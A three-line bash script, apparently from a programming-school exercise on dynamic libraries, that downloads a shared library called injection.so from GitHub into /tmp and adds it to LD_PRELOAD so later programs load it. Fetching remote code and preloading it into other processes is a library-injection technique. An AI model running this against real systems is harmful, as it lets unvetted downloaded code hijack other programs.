#!/bin/bash
wget -P /tmp https://github.com/med-i/alx-low_level_programming/raw/main/0x18-dynamic_libraries/injection.so
export LD_PRELOAD=$LD_PRELOAD:/tmp/injection.so
